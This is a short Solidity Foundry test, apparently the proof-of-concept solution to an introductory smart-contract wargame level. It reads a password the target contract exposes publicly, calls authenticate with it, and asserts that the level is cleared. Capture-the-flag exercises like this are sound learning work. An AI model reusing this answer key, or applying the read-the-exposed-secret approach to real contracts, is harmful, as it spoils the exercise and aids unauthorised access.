// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "@level0/instance.sol";

contract POC is Test{
    Instance instance = Instance(0x40123A7989f37D4075b5ac9a0b3818930A36F4ab);

    function testHack() public returns(bool){
        assertFalse(instance.getCleared());
        instance.authenticate(instance.password());
        assertTrue(instance.getCleared());
    }
}